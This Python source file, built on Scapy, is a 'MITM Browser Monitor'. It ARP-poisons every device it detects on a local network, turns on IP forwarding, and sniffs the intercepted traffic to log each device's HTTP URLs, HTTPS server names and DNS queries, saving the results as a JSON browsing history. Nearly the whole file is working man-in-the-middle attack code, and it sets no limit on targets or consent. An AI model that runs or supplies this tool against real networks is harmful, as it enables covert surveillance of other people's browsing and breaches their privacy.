#!/usr/bin/env python3
"""
MITM Browser Monitor - Captures and displays web browsing activity
Intercepts HTTP/HTTPS traffic to show what websites users are visiting
"""

import sys
import time
import json
import threading
from collections import defaultdict
from datetime import datetime
import re

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.http import HTTPRequest, HTTP
    from scapy.layers.dns import DNS, DNSQR
except ImportError:
    print("ERROR: Scapy not installed. Run: pip install scapy")
    sys.exit(1)

import socket


class MITMBrowserMonitor:
    """Man-in-the-Middle Browser Monitor - Track all web browsing activity"""
    
    def __init__(self, router_ip="192.168.1.1", interface=None):
        self.router_ip = router_ip
        self.interface = interface or conf.iface
        self.gateway_mac = None
        self.my_mac = None
        self.my_ip = None
        
        # Device tracking
        self.devices = {}  # mac -> device_info
        self.device_lock = threading.Lock()
        
        # Browsing history tracking
        self.browsing_history = []  # List of {timestamp, device_mac, device_ip, url, method, host}
        self.dns_cache = {}  # IP -> hostname mapping
        self.history_lock = threading.Lock()
        
        # Traffic statistics
        self.traffic_stats = defaultdict(lambda: {
            'bytes_sent': 0, 
            'bytes_recv': 0, 
            'packets': 0,
            'http_requests': 0,
            'https_requests': 0,
            'dns_queries': 0
        })
        
        # Running state
        self.running = False
        self.arp_thread = None
        
        # Callbacks for real-time updates
        self.on_new_url_callback = None
        self.on_device_update_callback = None
        
        # Get network info
        self._init_network_info()
    
    def _init_network_info(self):
        """Initialize network interface information"""
        try:
            # Get my IP and MAC
            self.my_ip = get_if_addr(self.interface)
            self.my_mac = get_if_hwaddr(self.interface)
            
            # Get gateway MAC via ARP
            print(f"[*] Resolving gateway {self.router_ip}...")
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.router_ip)
            result = srp(arp_request, timeout=2, verbose=False)[0]
            
            if result:
                self.gateway_mac = result[0][1].hwsrc
                print(f"[✓] Gateway MAC: {self.gateway_mac}")
            else:
                print(f"[!] Could not resolve gateway MAC")
                self.gateway_mac = "ff:ff:ff:ff:ff:ff"
                
        except Exception as e:
            print(f"[!] Network init error: {e}")
            self.my_ip = "0.0.0.0"
            self.my_mac = "00:00:00:00:00:00"
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding to act as gateway"""
        try:
            if sys.platform == "win32":
                # Windows: Enable IP routing
                os.system(f"netsh interface ipv4 set interface \"{self.interface}\" forwarding=enabled")
                print("[✓] IP forwarding enabled (Windows)")
            else:
                # Linux/Mac
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                print("[✓] IP forwarding enabled (Linux)")
        except Exception as e:
            print(f"[!] Could not enable IP forwarding: {e}")
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding (restore normal state)"""
        try:
            if sys.platform == "win32":
                os.system(f"netsh interface ipv4 set interface \"{self.interface}\" forwarding=disabled")
            else:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[✓] IP forwarding disabled")
        except Exception as e:
            print(f"[!] Could not disable IP forwarding: {e}")
    
    def arp_spoof(self, target_ip, target_mac):
        """Send ARP spoof packet to redirect traffic through us"""
        # Tell target that we are the gateway
        spoof_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                          psrc=self.router_ip, hwsrc=self.my_mac)
        
        # Tell gateway that we are the target
        spoof_gateway = ARP(op=2, pdst=self.router_ip, hwdst=self.gateway_mac,
                           psrc=target_ip, hwsrc=self.my_mac)
        
        send(spoof_target, verbose=False)
        send(spoof_gateway, verbose=False)
    
    def restore_arp(self, target_ip, target_mac):
        """Restore original ARP tables"""
        restore_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                            psrc=self.router_ip, hwsrc=self.gateway_mac)
        
        restore_gateway = ARP(op=2, pdst=self.router_ip, hwdst=self.gateway_mac,
                             psrc=target_ip, hwsrc=target_mac)
        
        send(restore_target, count=3, verbose=False)
        send(restore_gateway, count=3, verbose=False)
    
    def arp_poison_loop(self):
        """Continuously poison ARP tables to maintain MITM position"""
        print("[*] Starting ARP spoofing loop...")
        
        while self.running:
            try:
                with self.device_lock:
                    for mac, device in self.devices.items():
                        if mac != self.my_mac and mac != self.gateway_mac:
                            ip = device.get('ip')
                            if ip and ip != self.router_ip:
                                self.arp_spoof(ip, mac)
                
                time.sleep(2)  # Spoof every 2 seconds
                
            except Exception as e:
                print(f"[!] ARP poison error: {e}")
                time.sleep(1)
    
    def extract_http_info(self, packet):
        """Extract HTTP request information"""
        try:
            if packet.haslayer(HTTPRequest):
                http_layer = packet[HTTPRequest]
                
                # Get request details
                method = http_layer.Method.decode('utf-8', errors='ignore') if http_layer.Method else 'GET'
                host = http_layer.Host.decode('utf-8', errors='ignore') if http_layer.Host else ''
                path = http_layer.Path.decode('utf-8', errors='ignore') if http_layer.Path else '/'
                
                # Build full URL
                url = f"http://{host}{path}"
                
                return {
                    'method': method,
                    'host': host,
                    'path': path,
                    'url': url,
                    'protocol': 'HTTP'
                }
        except:
            pass
        
        return None
    
    def extract_https_info(self, packet):
        """Extract HTTPS connection info (SNI from TLS handshake)"""
        try:
            if TCP in packet and packet[TCP].dport == 443:
                # Try to extract SNI (Server Name Indication) from TLS ClientHello
                payload = bytes(packet[TCP].payload)
                
                # Look for SNI extension in ClientHello
                if b'\x00\x00' in payload:  # Server Name extension type
                    # This is a simplified SNI extraction
                    # Real implementation would parse TLS structure properly
                    matches = re.findall(rb'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', payload)
                    if matches:
                        for match in matches:
                            try:
                                hostname = match.decode('utf-8')
                                if '.' in hostname and len(hostname) > 3:
                                    return {
                                        'method': 'CONNECT',
                                        'host': hostname,
                                        'path': '/',
                                        'url': f"https://{hostname}/",
                                        'protocol': 'HTTPS'
                                    }
                            except:
                                pass
        except:
            pass
        
        return None
    
    def extract_dns_query(self, packet):
        """Extract DNS query information"""
        try:
            if DNS in packet and packet.haslayer(DNSQR):
                query = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                
                # Cache DNS queries for later URL resolution
                if IP in packet:
                    src_ip = packet[IP].src
                    self.dns_cache[query] = src_ip
                
                return query
        except:
            pass
        
        return None
    
    def get_manufacturer(self, mac):
        """Get manufacturer from MAC address OUI"""
        mac_db = {
            'A4:91:B1': 'Huawei',
            '00:E0:4C': 'Realtek',
            '00:50:56': 'VMware',
            '08:00:27': 'VirtualBox',
            '00:1C:42': 'Apple',
            '00:25:00': 'Apple',
            'AC:DE:48': 'Apple',
            '28:6A:BA': 'Apple',
            '3C:E0:72': 'Samsung',
            '00:12:FB': 'Samsung',
            '70:F9:27': 'Intel',
            '00:1E:65': 'Intel',
            'E8:94:F6': 'TP-Link',
            '50:C7:BF': 'TP-Link',
            '00:0C:29': 'VMware',
        }
        
        oui = mac[:8].upper()
        return mac_db.get(oui, 'Unknown')
    
    def packet_handler(self, packet):
        """Process each intercepted packet"""
        try:
            if not packet.haslayer(Ether):
                return
            
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            
            # Skip our own packets and broadcasts
            if src_mac == self.my_mac or src_mac == "ff:ff:ff:ff:ff:ff":
                return
            
            # Track device
            with self.device_lock:
                if src_mac not in self.devices:
                    self.devices[src_mac] = {
                        'mac': src_mac,
                        'first_seen': datetime.now().isoformat(),
                        'last_seen': datetime.now().isoformat(),
                        'ip': None,
                        'hostname': 'Unknown',
                        'manufacturer': self.get_manufacturer(src_mac),
                        'type': 'Unknown Device',
                        'os': 'Unknown'
                    }
                    
                    # Notify callback
                    if self.on_device_update_callback:
                        self.on_device_update_callback(src_mac, self.devices[src_mac])
                
                device = self.devices[src_mac]
                device['last_seen'] = datetime.now().isoformat()
                
                # Extract IP address
                if IP in packet:
                    src_ip = packet[IP].src
                    device['ip'] = src_ip
                    
                    # Update traffic stats
                    self.traffic_stats[src_mac]['bytes_sent'] += len(packet)
                    self.traffic_stats[src_mac]['packets'] += 1
            
            # Extract browsing information
            if IP in packet:
                src_ip = packet[IP].src
                
                # HTTP traffic
                http_info = self.extract_http_info(packet)
                if http_info:
                    with self.history_lock:
                        entry = {
                            'timestamp': datetime.now().isoformat(),
                            'time_display': datetime.now().strftime('%H:%M:%S'),
                            'device_mac': src_mac,
                            'device_ip': src_ip,
                            'device_name': device.get('hostname', 'Unknown'),
                            'method': http_info['method'],
                            'host': http_info['host'],
                            'path': http_info['path'],
                            'url': http_info['url'],
                            'protocol': http_info['protocol']
                        }
                        self.browsing_history.append(entry)
                        self.traffic_stats[src_mac]['http_requests'] += 1
                        
                        # Notify callback
                        if self.on_new_url_callback:
                            self.on_new_url_callback(entry)
                        
                        print(f"[HTTP] {src_ip} -> {http_info['url']}")
                
                # HTTPS traffic (SNI extraction)
                https_info = self.extract_https_info(packet)
                if https_info:
                    with self.history_lock:
                        entry = {
                            'timestamp': datetime.now().isoformat(),
                            'time_display': datetime.now().strftime('%H:%M:%S'),
                            'device_mac': src_mac,
                            'device_ip': src_ip,
                            'device_name': device.get('hostname', 'Unknown'),
                            'method': https_info['method'],
                            'host': https_info['host'],
                            'path': https_info['path'],
                            'url': https_info['url'],
                            'protocol': https_info['protocol']
                        }
                        self.browsing_history.append(entry)
                        self.traffic_stats[src_mac]['https_requests'] += 1
                        
                        # Notify callback
                        if self.on_new_url_callback:
                            self.on_new_url_callback(entry)
                        
                        print(f"[HTTPS] {src_ip} -> {https_info['url']}")
                
                # DNS queries
                dns_query = self.extract_dns_query(packet)
                if dns_query:
                    self.traffic_stats[src_mac]['dns_queries'] += 1
                    print(f"[DNS] {src_ip} -> {dns_query}")
                    
        except Exception as e:
            # Silently ignore packet processing errors
            pass
    
    def start_monitoring(self, duration=None, callback_new_url=None, callback_device_update=None):
        """Start MITM browser monitoring"""
        print(f"\n{'='*70}")
        print(f"🕵️  MITM Browser Monitor")
        print(f"{'='*70}")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Gateway: {self.router_ip} ({self.gateway_mac})")
        print(f"[*] My IP: {self.my_ip} ({self.my_mac})")
        if duration:
            print(f"[*] Duration: {duration} seconds")
        else:
            print(f"[*] Duration: Continuous (press Ctrl+C to stop)")
        print(f"{'='*70}\n")
        
        # Set callbacks
        self.on_new_url_callback = callback_new_url
        self.on_device_update_callback = callback_device_update
        
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Start ARP poisoning in background
        self.running = True
        self.arp_thread = threading.Thread(target=self.arp_poison_loop, daemon=True)
        self.arp_thread.start()
        
        # Start packet sniffing
        print("[*] Intercepting network traffic...")
        print("[*] Capturing HTTP/HTTPS browsing activity...\n")
        
        try:
            # Sniff packets
            if duration:
                sniff(prn=self.packet_handler, 
                      iface=self.interface, 
                      timeout=duration,
                      store=False)
            else:
                sniff(prn=self.packet_handler, 
                      iface=self.interface,
                      store=False)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        except Exception as e:
            print(f"\n[!] Sniffing error: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Stop MITM monitoring and restore network"""
        print("\n[*] Stopping MITM browser monitor...")
        self.running = False
        
        # Restore ARP tables
        print("[*] Restoring ARP tables...")
        with self.device_lock:
            for mac, device in self.devices.items():
                if mac != self.my_mac and mac != self.gateway_mac:
                    ip = device.get('ip')
                    if ip:
                        self.restore_arp(ip, mac)
        
        # Disable IP forwarding
        self.disable_ip_forwarding()
        
        print("[✓] Network restored to normal state")
    
    def get_browsing_history(self):
        """Get all captured browsing history"""
        with self.history_lock:
            return self.browsing_history.copy()
    
    def get_devices(self):
        """Get all detected devices"""
        with self.device_lock:
            devices_copy = {}
            for mac, device in self.devices.items():
                dev = device.copy()
                dev['traffic'] = dict(self.traffic_stats[mac])
                devices_copy[mac] = dev
            return devices_copy
    
    def print_results(self):
        """Print browsing history results"""
        history = self.get_browsing_history()
        devices = self.get_devices()
        
        print(f"\n{'='*80}")
        print(f"📊 MITM Browser Monitor Results")
        print(f"{'='*80}")
        print(f"Devices: {len(devices)} | URLs Captured: {len(history)}")
        print(f"{'='*80}\n")
        
        # Print browsing history
        print("🌐 Browsing History:")
        print("-" * 80)
        
        for idx, entry in enumerate(history, 1):
            print(f"[{idx}] {entry['time_display']} | {entry['device_ip']} | {entry['protocol']}")
            print(f"    {entry['method']} {entry['url']}")
            print()
        
        # Print device statistics
        print("\n📱 Device Statistics:")
        print("-" * 80)
        
        for mac, device in devices.items():
            traffic = device.get('traffic', {})
            print(f"{device.get('hostname', 'Unknown')} ({device.get('ip', 'Unknown')})")
            print(f"  MAC: {mac}")
            print(f"  HTTP Requests: {traffic.get('http_requests', 0)}")
            print(f"  HTTPS Requests: {traffic.get('https_requests', 0)}")
            print(f"  DNS Queries: {traffic.get('dns_queries', 0)}")
            print(f"  Traffic: ↑{traffic.get('bytes_sent', 0)} bytes ({traffic.get('packets', 0)} packets)")
            print()


def main():
    """Main function for standalone testing"""
    if len(sys.argv) > 1:
        router_ip = sys.argv[1]
    else:
        router_ip = "192.168.1.1"
    
    print("⚠️  WARNING: This tool requires Administrator/root privileges!")
    print("⚠️  It will intercept ALL network traffic (ARP spoofing)")
    print()
    
    try:
        monitor = MITMBrowserMonitor(router_ip=router_ip)
        monitor.start_monitoring(duration=60)  # Monitor for 60 seconds
        monitor.print_results()
        
        # Save results to JSON
        results = {
            'devices': monitor.get_devices(),
            'browsing_history': monitor.get_browsing_history()
        }
        
        output_file = 'mitm_browsing_history.json'
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n[✓] Results saved to {output_file}")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
